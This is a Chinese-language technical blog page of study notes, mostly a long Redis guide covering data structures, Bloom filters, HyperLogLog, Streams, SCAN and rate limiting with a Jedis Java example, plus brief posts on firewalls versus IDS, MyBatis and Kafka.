<p>入侵检测系统（IDS）则主要用于监控网络流量，以检测潜在的恶意活动。IDS 会根据特征库、异常行为等来识别攻击行为，主要目的是检测潜在的恶意行为，并在检测到时发出警报。</p>
<p>防火墙和 IDS 之间的关键区别在于，防火墙主要用于过滤网络流量，而 IDS 主要用于监控网络流量并检测异常行为。</p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2023-05-06T03:04:46.000Z" title="2023/5/6 11:04:46">2023-05-06</time></span><span class="level-item">Updated&nbsp;<time dateTime="2023-05-06T03:09:08.943Z" title="2023/5/6 11:09:08">2023-05-06</time></span><span class="level-item">a few seconds read (About 36 words)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2023/05/06/MyBatis/">MyBatis</a></p><div class="content"><h1 id="MyBatis缓存"><a href="#MyBatis缓存" class="headerlink" title="MyBatis缓存"></a>MyBatis缓存</h1><p>MyBatis的缓存分为一级缓存和二级缓存，一级缓存是默认开启的，而且不能关闭</p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2023-05-06T03:03:13.000Z" title="2023/5/6 11:03:13">2023-05-06</time></span><span class="level-item">Updated&nbsp;<time dateTime="2023-05-30T01:22:09.969Z" title="2023/5/30 09:22:09">2023-05-30</time></span><span class="level-item">a few seconds read (About 41 words)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2023/05/06/Kafka/">Kafka</a></p><div class="content"><h1 id="消息处理模式"><a href="#消息处理模式" class="headerlink" title="消息处理模式"></a>消息处理模式</h1><p>消息广播</p>
<p>消息过滤</p>
<p>消息批处理</p>
<p>日志消息处理</p>
<p>通信模块</p>
<p>消息结构</p>
<p>数据存储</p>
<p>数据刷盘</p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2023-05-06T03:03:01.000Z" title="2023/5/6 11:03:01">2023-05-06</time></span><span class="level-item">Updated&nbsp;<time dateTime="2023-05-26T02:02:29.466Z" title="2023/5/26 10:02:29">2023-05-26</time></span><span class="level-item">2 hours read (About 13642 words)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2023/05/06/Redis/">Redis</a></p><div class="content"><h1 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h1><h2 id="基础数据结构"><a href="#基础数据结构" class="headerlink" title="基础数据结构"></a>基础数据结构</h2><h3 id="5种基础数据结构"><a href="#5种基础数据结构" class="headerlink" title="5种基础数据结构"></a>5种基础数据结构</h3><h4 id="string（字符串）"><a href="#string（字符串）" class="headerlink" title="string（字符串）"></a>string（字符串）</h4><p>Redis的string是动态字符串，可以被修改，内部实现结构类似于Java的ArrayList，采用预分配冗余空间的方式来减少内存的频繁分配，如果字符串长度小于1MB，扩容方式是加倍现有的空间，如果字符串长度超过1MB，扩容方式是只多扩1MB的空间。</p>
<p>Redis所有数据结构都以唯一的key字符串作为名称</p>
<p>一个常见的用途是缓存用户信息，将用户信息序列化成字符串，存入Redis缓存，取出用户信息的时候会经过一次反序列化的过程</p>
<p>mset、mget命令可以实现对多个字符串进行批量读写</p>
<p>ex后缀可以在set的时候指定过期时间</p>
<p>nx后缀可以在set的时候设置条件，如果key不存在才set</p>
<h4 id="list（列表）"><a href="#list（列表）" class="headerlink" title="list（列表）"></a>list（列表）</h4><p>Redis的列表相当于Java的LinkedList，是双向链表，不是数组。</p>
<p>当 List 中的元素数量较少且元素都比较短时，Redis 通常会采用 ziplist 来存储。ziplist 是一个特殊的双向链表（本质上是一个字节数组），特殊之处在于：没有维护双向指针，prev、next，而是存储了上一个 entry 的长度和当前 entry 的长度，通过长度推算下一个元素。多个ziplist之间使用指针串联起来，这种结构叫做quicklist（快速链表）。</p>
<p>底层使用的是ziplist，即压缩列表</p>
<p>list常用来做异步队列使用，将需要延后处理的任务序列化成字符串放入列表</p>
<p>支持的命令有：rpush、rpop、lpush、lpop、lindex、lrange、ltrim</p>
<h4 id="hash（字典）"><a href="#hash（字典）" class="headerlink" title="hash（字典）"></a>hash（字典）</h4><p>相当于Java中的HashMap，跟HashMap一样，底层也是数组+链表的实现方式，不同的是Redis的hash的值只能是字符串，且rehash的方式也不一样，rehash 是指在哈希表发生扩容时进行的重新哈希操作。扩容过程包括创建新的哈希表、将旧哈希表的元素 rehash 到新哈希表中，redis采用了渐进式哈希扩容的策略，通过分多次操作逐步完成整个扩容过程，避免服务阻塞的问题。</p>
<p>具体来说，Redis 的哈希表扩容过程如下：</p>
<ol>
<li><p>创建新哈希表：系统会根据当前数据库的元素数量和设置的负载因子计算出扩容所需的最小桶数，然后创建一个新的哈希表，将其指针保存在旧哈希表的 rehashidx 属性中。</p>
</li>
<li><p>逐步 rehash 元素：从旧哈希表中取出一个桶（或一个链表），并将其中的元素 rehash 到新哈希表中，如果新哈希表中的相应桶为空，则直接插入元素；如果不为空，则使用链表结构将其作为链表头插入。这个过程需要遍历旧哈希表中所有的非空桶，每次操作都只处理一个桶中的元素，避免一次性处理过多数据。</p>
</li>
<li><p>完成 rehash：当旧哈希表中的所有元素都被 rehash 到新哈希表后，会释放旧哈希表占用的内存。</p>
</li>
</ol>
<p>支持的命令有：hset、hget、hlen、hgetall等</p>
<h4 id="set（集合）"><a href="#set（集合）" class="headerlink" title="set（集合）"></a>set（集合）</h4><p>Redis的集合set相当于Java的HashSet，是无序的，内部实现相当于一个特殊的字典，字典中所有的value都是NULL。</p>
<p>支持的命令有：sadd、scard、sismember等，scard用于获取计数值。</p>
<h4 id="zset（有序集合）"><a href="#zset（有序集合）" class="headerlink" title="zset（有序集合）"></a>zset（有序集合）</h4><p>类似于Java中的SortedSet和HashMap的结合体，同样是key-value结构，不同的是zset的value不是一个值，而是member和score两个值（可理解为member-score键值对），member是不重复的，按照score进行排序。底层实现使用的是跳表。</p>
<p>zset可以用来存储粉丝列表，value是粉丝的用户id，score是关注时间，按照关注时间排序，类似的，还可以用来存储学生的成绩。</p>
<p>zset支持的操作：</p>
<ul>
<li>zadd：向有序集合添加一个或多个成员，并指定对应的分数。</li>
<li>zrank：获取成员在有序集合中的排名（从小到大）。</li>
<li>zrevrank：获取成员在有序集合中的倒序排名（从大到小）。</li>
<li>zrange：按照排名范围获取有序集合中的成员。</li>
<li>zrevrange：按照倒序排名范围获取有序集合中的成员。</li>
<li>zscore：获取成员的分数。</li>
<li>zincrby：增加成员的分数。</li>
<li>zrem：从有序集合中移除一个或多个成员。</li>
<li>zcard：获取有序集合元素的总和</li>
</ul>
<h3 id="容器型数据结构的两条规则"><a href="#容器型数据结构的两条规则" class="headerlink" title="容器型数据结构的两条规则"></a>容器型数据结构的两条规则</h3><p>list、set、hash、zset这四种数据结构都是容器型数据结构，容器型数据结构遵从两条规则：</p>
<ol>
<li>create if not exists：如果添加元素时容器不存在，就创建。</li>
<li>drop if no elements：如果容器里没有元素，那么立即删除容器释放内存。</li>
</ol>
<h3 id="过期时间"><a href="#过期时间" class="headerlink" title="过期时间"></a>过期时间</h3><p>Redis中所有对象都可以设置过期时间。例如，可以对一个hash对象设置过期时间，但是不能对齐某一个key-value设置过期时间。</p>
<p>需要注意的是，如果一个对象已经设置了过期时间，然后调用set修改了这个对象，那么之前设置是过期时间就会失效。</p>
<h2 id="其它数据结构"><a href="#其它数据结构" class="headerlink" title="其它数据结构"></a>其它数据结构</h2><h3 id="位图"><a href="#位图" class="headerlink" title="位图"></a>位图</h3><p>对于一些需要存储大量bool型数据的情况（比如一年内的签到数据），如果使用普通的key-value，存储空间消耗极大。为解决这个问题，Redis提供了位图数据结构（不是全新的数据结构，底层其实是string字符串）。位图的最小单位是比特（0或1）。</p>
<p>支持的命令有：getbit、setbit、bitcount、bitpos、bitfield等</p>
<p>其中bitcount和bitpos命令是位图的统计命令，bitcount用来统计指定范围内1的个数、bitops用来查找指定范围内出现的第一个0或1的位置。</p>
<p>bitfield命令可以实现一次性对指定位片段进行多位操作，bitfield有三个子命令，get、set、incrby。如果使用incrby命令时出现了溢出，Redis默认的处理方式是折返（wrap），即不对溢出进行特殊处理，溢出之后是什么值就取什么值。Redisbitfield命令的选择溢出策略的子命令是overflow，用户可以选择溢出行为，包括折返、失败（fail，报错并不予执行）、饱和截断（sat，超过了范围就停留在最大或最小值）。</p>
<p>常用的使用方式有：零存（对位值逐个设置）整取、零存零取、整存（使用字符串一次性填充所有位）零取。</p>
<h3 id="HyperLogLog"><a href="#HyperLogLog" class="headerlink" title="HyperLogLog"></a>HyperLogLog</h3><p>要统计网站上每个网页每天的UV数据总数，数据不需要太精确。由于统计UV需要去重，所以简单的方案是使用set，但是如果页面访问量很大，就存在浪费存储空间的问题。更好的解决方案是使用HyperLogLog，HyperLogLog 使用的内存消耗最多是12 KB，无论估算的基数有多大，它始终只占用 12 KB 的内存空间。</p>
<p>HyperLogLog提供了不精确的去重计数方案，标准误差是0.81%，这样的精确度可以满足UV统计需求。</p>
<p>HyperLogLog之所以内存消耗如此之小，是因为HyperLogLog的存储算法具备这一特点：</p>
<ol>
<li>当计数比较小时，它的存储空间采用稀疏矩阵存储。</li>
<li>计数值增大到稀疏矩阵占用空间超过阈值后，才会一次性转变为稠密矩阵，占用12KB。</li>
</ol>
<p>HyperLogLog提供的命令有：pfadd、pfcount、pfmerge</p>
<p>pfadd用来添加数据，pfcount用来获取计数值，pfmerge用来合并HyperLogLog</p>
<p>补充：</p>
<p>UV（Unique Visitor）数据指的是网站或应用程序的独立访问者数量。UV数据用于衡量网站或应用程序的受众规模和用户活跃度。UV数据通常基于用户的唯一标识符（如用户ID、Cookie、设备ID等）进行统计，以便区分不同的访问者。它可以帮助网站或应用程序的管理者了解其用户群体的规模、用户活跃度、用户留存率等重要指标，从而做出相应的优化和决策。</p>
<p>PV（Page View）数据指的是网站或应用程序的页面访问次数。PV数据记录了每个页面被访问的次数，无论是同一个用户多次访问同一个页面，还是不同用户访问同一个页面，每一次访问都计算为一次PV。PV数据可以帮助评估网站或应用程序的流量、页面热度以及用户行为。</p>
<h3 id="布隆过滤器"><a href="#布隆过滤器" class="headerlink" title="布隆过滤器"></a>布隆过滤器</h3><p>虽然HyperLogLog数据结构能够对数据进行去重计数，但是不能用来判断数据是否已存在。布隆过滤器（Bloom Filter）就是专门用来解决这种问题的，用来判断对象是否存在，相比set能够节省90%的空间，唯一不足是不精确，有一定的误判概率。</p>
<p>布隆过滤器判断结果的真实性的规则是：</p>
<ol>
<li>如果布隆过滤器输出某个值存在，这个值可能不存在</li>
<li>如果布隆过滤器输出某个值不存在，这个值一定不存在</li>
</ol>
<p>布隆过滤器提供两条命令：bf.add（一次添加一个元素）、bf.madd（一次添加多个元素）、bf.exists</p>
<p>Redis的布隆过滤器是从Redis4.0开始以插件的形式添加到Redis中的，要使用Redis的布隆过滤器，需要安装对应插件。在使用时，布隆过滤器的initial_size（预计放入的元素数量）参数越大，error_rate（误判率）越小。</p>
<p><strong>布隆过滤器的原理：</strong></p>
<p>布隆过滤器底层的数据结构是一个大型的位数组，添加key时，使用几个不同的无偏hash函数，对添加到布隆过滤器的key进行hash，分别算出索引值，然后将索引值位置的值置为1。判断key是否存在时，对添加到布隆过滤器的key进行hash，分别算出索引值，然后看位数组中这几个位的值是否都是1，如果都是1，说明极有可能存在，如果不都是1，说明一定不存在。</p>
<p>所谓无偏就是能够把元素的hash值算得比较均匀，让key被hash映射到位数组中的位值比较随机。</p>
<p><strong>布隆过滤器的空间占用估计：</strong></p>
<p>计算布隆过滤器的空间占用估计需要两个参数，预计元素的数量（设为N）和错误率（设为F），可以得到两个输出，位数组的长度（设为L）和hash函数的最佳数量（设为K）：</p>
<p>K &#x3D; 0.7 * (L &#x2F; N)</p>
<p>F &#x3D; 0.6185 ^ (L &#x2F; N)</p>
<p>K和（L&#x2F;N）成正比，F和（L&#x2F;N）成反比。</p>
<p>在线计算布隆过滤器计算器：<a target="_blank" rel="noopener" href="https://krisives.github.io/bloom-calculator">https://krisives.github.io/bloom-calculator</a></p>
<img src="./Redis/image-20230522110209728.png" alt="image-20230522110209728" style="zoom:67%;" />

<p><strong>当实际元素数量超过设置的预计元素的数量：</strong></p>
<p>当实际元素数量超过设置的预计元素的数量，错误率会有陡峭的增大，设实际元素数量和设置的预计元素的数量比值为T，使用的hash函数的数量是K，错误率（设为F）的计算公式是：</p>
<p>F &#x3D; (1 - 0.5^T) ^ K;</p>
<p><strong>布隆过滤器的其它应用：</strong></p>
<ul>
<li>在爬虫系统中对URL进行去重。</li>
<li>在NoSQL数据库中通过内存中的布隆过滤器过滤掉不存在的row的请求。</li>
<li>邮箱系统的垃圾邮件过滤。</li>
</ul>
<h3 id="GeoHash"><a href="#GeoHash" class="headerlink" title="GeoHash"></a>GeoHash</h3><p>Redis在3.2版本后增加了处理地理位置信息的模块Geo（底层使用的是zset），可以用于实现“附近的单车”、“附近的餐馆”这样的需要对地理位置距离进行排序的功能，在Redis中，是基于GeoHash算法实现的。</p>
<p>GeoHash算法将二维的经纬度数据映射到一维的整数（使用二刀法等刀法实现），要寻找附近的XXX时只需要找一维下的附近的点。计算后的地图元素的坐标都会变为整数，通过这个整数可以还原出元素的坐标，整数越长，还原出来的坐标值的损失程度就越小。GeoHash算法会对这个整数做一次Base32编码。</p>
<p>Base32 是一种数据编码机制，使用 32 个可打印字符（字母 A-Z 和数字 2-7）对任意字节数据进行编码的方案。Base32 将任意字符串按照字节进行切分，并将每个字节对应的二进制值（不足 8 比特高位补 0）串联起来，按照 5 比特一组进行切分，并将每组二进制值转换成十进制来对应 32 个可打印字符中的一个。由于数据的二进制传输是按照 8 比特一组进行（即一个字节），因此 Base32 按 5 比特切分的二进制数据必须是 40 比特的倍数（5 和 8 的最小公倍数）。不足 40 比特的倍数则通过填充符号“&#x3D;”来补齐。</p>
<p>支持的命令有：geoadd、geodist、geopos、georadiusbymember、georadius</p>
<ul>
<li>geodist：获取两个元素之间的距离</li>
<li>geopos：获取集合中任意元素的经纬度坐标</li>
<li>georadiusbymember：查询元素附近的其它元素</li>
<li>georadius：查找经纬度坐标附近的其它元素</li>
</ul>
<h3 id="Stream"><a href="#Stream" class="headerlink" title="Stream"></a>Stream</h3><p>Redis Stream是Redis 5.0版本中新增的数据结构，是一个支持多播的可持久化的消息队列。</p>
<p>Stream的消息有定长的功能，在 xadd 的指令中提供了一定长长度参数 maxlen，就可以实现清除旧有超长的消息。</p>
<h4 id="消费组"><a href="#消费组" class="headerlink" title="消费组"></a>消费组</h4><p>每个Stream都可以挂载多个消费组（Consumer Group），每个消费组会有一个游标（last_delivered_id），用于表示当前消费组以及消费到哪条消息。</p>
<p>消费组之间是独立的</p>
<p>一个消费组可以挂载多个消费者，任意一个消费者读取了消息都会使游标向前移动。</p>
<h5 id="创建消费组"><a href="#创建消费组" class="headerlink" title="创建消费组"></a>创建消费组</h5><p>消费组不会自动创建，创建消费组的命令是xgroup create，创建消费组需要提供起始消息 ID 参数用来初始化 last_delivered_id 变量。</p>
<h5 id="独立消费"><a href="#独立消费" class="headerlink" title="独立消费"></a>独立消费</h5><p>可以不定义消费组，将 Stream 当成普通的消息队列（list）来使用。</p>
<h4 id="消息"><a href="#消息" class="headerlink" title="消息"></a>消息</h4><h5 id="消息ID"><a href="#消息ID" class="headerlink" title="消息ID"></a>消息ID</h5><p>消息 ID 的形式是 TimestampInMillis-sequence，例如 1527846880572-5，它表示当前的消息再毫秒时间戳 1527846880572 时产生，并且是该毫秒内产生的第 5 条消息。消息 ID 可以由服务器自动生成，也可以由客户端自己指定，但是形式必须是 “整数-整数”，而且后面加入的消息的 ID 必须要大于前面的消息 ID。</p>
<h5 id="消息内容"><a href="#消息内容" class="headerlink" title="消息内容"></a>消息内容</h5><p>消息内容的形式的键值对。</p>
<h5 id="消息操作"><a href="#消息操作" class="headerlink" title="消息操作"></a>消息操作</h5><p>1）xadd：向 Stream 追加消息。</p>
<p>2）xdel：向 Stream 中删除消息，这里的删除仅仅是设置标志位，不影响消息总长度。</p>
<p>3）xrange：获取 Stream 中的消息列表，会自动过滤已经删除的消息。</p>
<p>4）xlen：获取 Stream 消息长度。</p>
<p>5）del：删除整个 Stream 消息列表的所有消息。</p>
<h4 id="消费者"><a href="#消费者" class="headerlink" title="消费者"></a>消费者</h4><h5 id="消费消息"><a href="#消费消息" class="headerlink" title="消费消息"></a>消费消息</h5><p>消费者使用<code>XREAD</code>或<code>XREADGROUP GROUP</code>命令从Redis Stream中读取消息。</p>
<p>使用 XREAD 以阻塞或非阻塞方式获取消息列表 ，语法格式：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">XREAD [COUNT count] [BLOCK milliseconds] STREAMS key [key ...] id [id ...]<br></code></pre></td></tr></table></figure>

<ul>
<li><strong>count</strong> ：数量</li>
<li><strong>milliseconds</strong> ：可选，阻塞毫秒数，没有设置就是非阻塞模式</li>
<li><strong>key</strong> ：队列名</li>
<li><strong>id</strong> ：消息 ID</li>
</ul>
<p>示例：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext"># 从 Stream 头部读取两条消息<br>XREAD COUNT 2 STREAMS mystream writers 0-0 0-0<br></code></pre></td></tr></table></figure>

<p>使用 XREADGROUP GROUP 读取消费组中的消息，语法格式：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">XREADGROUP GROUP group consumer [COUNT count] [BLOCK milliseconds] [NOACK] STREAMS key [key ...] ID [ID ...]<br></code></pre></td></tr></table></figure>

<ul>
<li><strong>group</strong> ：消费组名</li>
<li><strong>consumer</strong> ：消费者名。</li>
<li><strong>count</strong> ： 读取数量。</li>
<li><strong>milliseconds</strong> ： 阻塞毫秒数。</li>
<li><strong>key</strong> ： 队列名。</li>
<li><strong>ID</strong> ： 消息 ID。</li>
</ul>
<p>示例：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">XREADGROUP GROUP consumer-group-name consumer-name COUNT 1 STREAMS mystream &gt;<br></code></pre></td></tr></table></figure>

<p>消息 ID可以指定读取的起始位置，如<code>0</code>表示从最早的消息开始读取，或者使用特殊符号<code>&gt;</code>表示从当前最新的消息开始读取。</p>
<p>处理完消息后，消费者需要使用<code>XACK</code>命令确认消息的处理完成。</p>
<h5 id="pending-ids"><a href="#pending-ids" class="headerlink" title="pending_ids"></a>pending_ids</h5><p>每个消费者中维持一个状态变量pending_ids，简称为PEL(Pending Entries List)，记录了当前已经被客户端读取的但尚未被ACK的消息。</p>
<h2 id="Redis操作命令"><a href="#Redis操作命令" class="headerlink" title="Redis操作命令"></a>Redis操作命令</h2><h3 id="scan"><a href="#scan" class="headerlink" title="scan"></a>scan</h3><p>scan是一个Redis命令，用于从海量的key中找出满足特定前缀的key列表。相比Redis之前提供的keys命令（也可以完成这一功能）scan具备以下特点：</p>
<ul>
<li>虽然复杂度也是O(n)，但它是通过游标分步进行的，不会阻塞线程</li>
<li>提供了limit参数，可以控制服务器单次遍历的最大条数</li>
<li>返回的结果可能有重复（key存储在hash中，hash缩容时会重复遍历正在遍历的槽），需要客户端去重</li>
</ul>
<p>scan指令返回的游标就是第一维数组的位置索引（槽，slot），limit参数就表示需要遍历的槽位数</p>
<p>scan的遍历顺序是高进位加法，高进位加法从左边加，进位往右边移动。</p>
<p>对于rehash中的字典，scan会同时访问新旧两个数据结构</p>
<p>除了有可以遍历key的scan指令外，还有针对其它容器集合的遍历操作：</p>
<ul>
<li>sscan：遍历set集合</li>
<li>zscan：遍历zset集合</li>
<li>hscan：遍历hash字典中的元素</li>
</ul>
<p>scan还可以用来查找大key，方法是对于每个扫描出来的key，使用type指令获得key的类型，然后使用相应数据结构的size或len方法来得到value的大小，对于每一种类型，将大小排名的前若干名作为扫描结果输出。要编写上面过程的脚本比较繁琐，不过Redis官方已经在redis-cli指令中提供了这样的扫描功能。</p>
<p>示例如下：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">redis-cli -h 127.0.0.1 -0 6379 --bigkeys<br></code></pre></td></tr></table></figure>

<p>还可以指定睡眠时间：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">redis-cli -h 127.0.0.1 -0 6379 --bigkeys -i 0.1<br></code></pre></td></tr></table></figure>

<p>上面这条指令可以实现每个100条scan指令就会休眠0.1s</p>
<p>补充：</p>
<p>大key：指的是key对应的value值大，在实际业务中要尽量避免大key的产生，原因是大key会带来如下坏处：</p>
<ul>
<li>请求阻塞：redis为单线程，读、写或删除大key需要较长的处理时间，会阻塞后续的请求处理。</li>
<li>网络阻塞：大key会明显需要更长的传输时间，在整个传输时间内，占用大量的带宽，导致网络阻塞。</li>
<li>占用内存：大 key 在 Redis 内部通常会占用较多的内存空间，导致 Redis 的整体内存使用率变高，可能会引起内存溢出等问题。</li>
</ul>
<h2 id="Redis的应用"><a href="#Redis的应用" class="headerlink" title="Redis的应用"></a>Redis的应用</h2><h3 id="分布式锁"><a href="#分布式锁" class="headerlink" title="分布式锁"></a>分布式锁</h3><p>Redis可以用作分布式锁。</p>
<p>需要注意的点有：获取锁和设置超时时间需要是组合在一起的原子操作。</p>
<p>可重入性的一个实现方案是使用线程的ThreadLocal变量存储当前持有锁的计数</p>
<p>请求阻塞等待的一个实现方案是使用延时队列</p>
<h3 id="延时队列（zset做异步消息队列）"><a href="#延时队列（zset做异步消息队列）" class="headerlink" title="延时队列（zset做异步消息队列）"></a>延时队列（zset做异步消息队列）</h3><p>对于消费者数量较少等简单的使用情景，可以使用Redis创建消息队列，简化操作，但是需要注意的是，Redis不是专业的消息中间件，没有非常多的高级特性，没有ack保证，如果对消息的可靠性要求较高，那就不适合使用Redis。</p>
<p>Redis用来做异步消息队列的数据结构通常是list。当队列为空，消费者还是会不断地通过pop操作尝试获取数据，进行空轮询，浪费系统资源，解决方法是，让消费者线程进入sleep状态，一段时间比如1秒后再苏醒继续执行。</p>
<p>但是这会造成系统延迟，更好的解决方案是使用blpop或brpop，前缀b代表的是blocking（阻塞读），阻塞读保证在队列为空的时候，会立即进入休眠状态，一旦数据到来，则立刻醒过来。消息的延迟几乎为0。</p>
<p>当发生锁竞争时，要实现处理请求的阻塞等待，可以使用zset作为队列（Jedis提供的RedisDelayingQueue的底层就是基于Redis的zset数据结构），将冲突的请求放入队列延后处理。</p>
<h3 id="简单限流"><a href="#简单限流" class="headerlink" title="简单限流"></a>简单限流</h3><p>一个简单的限流策略的例子是，在指定时间内限制某个请求只允许发生N次。使用Redis可以实现这一功能。</p>
<p>实现示例如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RedisLimiter</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Jedis jedis;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">RedisLimiter</span><span class="hljs-params">(Jedis jedis)</span> &#123;<br>        <span class="hljs-built_in">this</span>.jedis = jedis;<br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isActionAllowed</span><span class="hljs-params">(String userId, String action, <span class="hljs-type">int</span> period, <span class="hljs-type">int</span> maxCount)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> String.format(<span class="hljs-string">&quot;hist:%s:%s&quot;</span>, userId, action);<br>        <span class="hljs-type">long</span> <span class="hljs-variable">nowTimeMillis</span> <span class="hljs-operator">=</span> System.currentTimeMillis();<br>        <span class="hljs-type">Pipeline</span> <span class="hljs-variable">pipeline</span> <span class="hljs-operator">=</span> jedis.pipelined();<br>        pipeline.zadd(key, nowTimeMillis, String.valueOf(nowTimeMillis)); <span class="hljs-comment">// 向key中添加member-score，方法的参数是zadd(String key, double score, String member)</span><br>        pipeline.zremrangeByScore(key, <span class="hljs-number">0</span>, nowTimeMillis - period * <span class="hljs-number">1000L</span>); <span class="hljs-comment">//删除key里面过期的member-score，只保留最近period * 1000L毫秒内的member-score</span><br>        Response&lt;Long&gt; count = pipeline.zcard(key);<br>        pipeline.expire(key, period); <span class="hljs-comment">//设置过期时间</span><br>        pipeline.close();<br>        pipeline.sync();<br>        <span class="hljs-type">Long</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> count.get();<br>        <span class="hljs-comment">//System.out.println(&quot;value = &quot; + value); //如果没有删除缓存，就可能看到value不是从1开始的</span><br>        <span class="hljs-keyword">return</span> count.get() &lt;= maxCount;<br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deleteCache</span><span class="hljs-params">(String userId, String action)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> String.format(<span class="hljs-string">&quot;hist:%s:%s&quot;</span>, userId, action);<br>        jedis.del(key);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> InterruptedException &#123;<br>        <span class="hljs-type">Jedis</span> <span class="hljs-variable">jedis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Jedis</span>();<br>        <span class="hljs-type">RedisLimiter</span> <span class="hljs-variable">redisLimiter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RedisLimiter</span>(jedis);<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">USER_ID</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;user&quot;</span>;<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">ACTION</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;getRequest&quot;</span>;<br>        redisLimiter.deleteCache(USER_ID, ACTION); <span class="hljs-comment">//删除Redis缓存</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">20</span>; i++) &#123;<br>            Thread.sleep(<span class="hljs-number">1</span>); <span class="hljs-comment">//sleep一毫秒，确保isActionAllowed函数中的nowTimeMillis值每次都不同</span><br>            System.out.println(redisLimiter.isActionAllowed(USER_ID, ACTION, <span class="hljs-number">60</span>, <span class="hljs-number">5</span>));<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>输出结果如下，只有当缓存中存储的次数不超过maxCount允许的数量（例子中是5），才可以返回true：</p>
<img src="./Redis/image-20230522172919614.png" alt="image-20230522172919614" style="zoom: 80%;" />

<h3 id="漏斗限流（Redis-Cell模块的cl-throttle命令）"><a href="#漏斗限流（Redis-Cell模块的cl-throttle命令）" class="headerlink" title="漏斗限流（Redis-Cell模块的cl.throttle命令）"></a>漏斗限流（Redis-Cell模块的cl.throttle命令）</h3><p>漏斗（Funnel）限流是最常用的限流算法之一。漏斗的剩余空间代表着行为当前可以进行的数量，漏斗的流水速率代表系统允许该行为的最大频率。要实现这一算法需要存储几个参数，比如漏斗容量、流水速率、漏斗剩余空间，可以考虑使用Redis的hash数据结构实现，但是存在一个问题，就是无法保证漏斗容量计算时涉及到的取值、运算、写值的三个过程的原子性。</p>
<p>Redis-Cell模块提供了漏斗算法的实现，解决了这一问题，该模块的命令只有一个，cl.throttle，该命令的使用格式如下：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">cl.throttle [key] [capacity] [velocity] [apply 1 operation](optional)<br></code></pre></td></tr></table></figure>

<ol>
<li>key：键</li>
<li>capacity：漏斗容量</li>
<li>velocity：流水速率</li>
<li>apply 1 operation：添加一个数，是可选的。</li>
</ol>
<p>示例：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">cl.throttle 1001 15 30 60 1<br></code></pre></td></tr></table></figure>

<p>输出如下：</p>
<p>1)(Integer) 0        # 0表示允许，1表示拒绝</p>
<p>2)(Integer) 15      # 漏斗容量是15</p>
